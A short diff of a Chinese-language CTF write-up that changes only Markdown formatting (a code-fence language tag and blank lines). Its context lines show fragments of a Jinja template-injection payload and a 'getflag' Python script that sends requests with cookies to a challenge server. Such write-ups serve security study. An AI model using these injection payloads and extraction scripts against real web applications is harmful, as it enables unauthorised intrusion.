@@ -171,7 +171,7 @@ text={% if request.values.e[18] == ()[request.values.a][request.values.b][reques
 
 getflag程序如下：
 
-```
+```python
 import requests,sys
 url = "http://4532bc69bc734acd8416204f0aa04f446e9d38024c5644e8.game.ichunqiu.com/bbs"
 cookie = {
@@ -201,6 +201,8 @@ for i in range(0,50):
                 break
 print(len(r.text))
 ```
+
+
 
 [![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204722-81aa70fe-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204722-81aa70fe-aac0-1.png)
 
